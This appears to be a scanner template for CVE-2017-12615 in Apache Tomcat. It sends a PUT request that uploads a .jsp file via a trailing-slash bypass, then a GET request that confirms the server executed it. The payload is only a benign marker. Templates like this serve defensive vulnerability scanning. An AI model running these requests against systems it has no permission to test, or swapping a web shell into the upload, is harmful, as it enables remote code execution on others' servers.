id: CVE-2017-12615

info:
  name: Apache Tomcat 的远程代码执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    Apache Tomcat 是 Apache 软件基金会的一个开源 Servlet 容器。
    在 Apache Tomcat 8.0.0-RC1 到 8.0.39、8.5.0 到 8.5.11、9.0.0.M1 到 9.0.0.M23 版本中，存在一个远程代码执行漏洞。
    攻击者可以通过构造恶意请求，利用该漏洞执行任意代码。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-12615
    - https://www.tenable.com/security/research/tra-2017-31
  tags: cve,cve2017,tomcat,rce
  created: 2023/08/10

set:
  filename: randomLowercase(6)
  verifyStr: randomLowercase(12)
  commentStr: randomLowercase(12)
rules:
  r0:
    request:
      method: PUT
      path: /{{filename}}.jsp/
      body: "{{verifyStr}} <%-- {{commentStr}} --%>"
    expression: response.status == 201
  r1:
    request:
      method: GET
      path: /{{filename}}.jsp
    expression: response.status == 200 && response.body.bcontains(bytes(verifyStr)) && !response.body.bcontains(bytes(commentStr))
expression: r0() && r1()
